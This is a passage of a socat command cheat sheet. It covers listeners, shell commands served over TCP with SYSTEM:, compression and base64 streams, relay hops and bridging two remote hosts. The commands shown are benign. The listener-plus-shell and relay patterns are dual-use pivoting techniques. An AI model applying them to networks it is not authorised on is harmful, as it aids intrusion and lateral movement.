### socat TCP6-LISTEN:8080,ipv6-v6only=0 STDOUT

```bash
socat TCP6-LISTEN:8080,ipv6-v6only=0 STDOUT
```

Listens on both IPv6 and IPv4 (dual stack) if OS supports it.


## Safe Cleanup

### socat - TCP:192.168.1.50:80; rm -f /tmp/data

```bash
socat - TCP:192.168.1.50:80; rm -f /tmp/data
```

Standard shell chaining to clean up files after socat exits.


## Process Substitution

### socat TCP-LISTEN:8080 SYSTEM:"diff <(ls) <(ls -a)"

```bash
socat TCP-LISTEN:8080 SYSTEM:"diff <(ls) <(ls -a)"
```

Serves the output of a complex shell command involving process substitution.


## Compression Stream

### socat TCP-LISTEN:8080 SYSTEM:"gzip -c"

```bash
socat TCP-LISTEN:8080 SYSTEM:"gzip -c"
```

Compresses incoming data on the fly using gzip.


## Decompression Stream

### socat TCP:192.168.1.50:8080 SYSTEM:"gunzip -c"

```bash
socat TCP:192.168.1.50:8080 SYSTEM:"gunzip -c"
```

Decompresses received network data on the fly.


## Base64 Encode Stream

### socat TCP-LISTEN:8080 SYSTEM:"base64"

```bash
socat TCP-LISTEN:8080 SYSTEM:"base64"
```

Encodes incoming data to Base64 format.


## Base64 Decode Stream

### socat TCP:192.168.1.50:8080 SYSTEM:"base64 -d"

```bash
socat TCP:192.168.1.50:8080 SYSTEM:"base64 -d"
```

Decodes incoming Base64 data back to binary.


## Multi-Hop Chain (Client)

### socat - TCP:relay1:8080 | socat - TCP:target:80

```bash
socat - TCP:relay1:8080 | socat - TCP:target:80
```

Manually piping two socat instances to create a hop (concept only, requires listener).


## Full Duplex Pipe

### socat TCP:192.168.1.10:80 TCP:192.168.1.20:80

```bash
socat TCP:192.168.1.10:80 TCP:192.168.1.20:80
```

Bridges two remote servers together, allowing them to talk to each other through you.

## Related tools

- [Netcat](https://terminal.rokibulroni.com/tool/utilities/Netcat)
- [SSH](https://terminal.rokibulroni.com/tool/lateral/ssh)
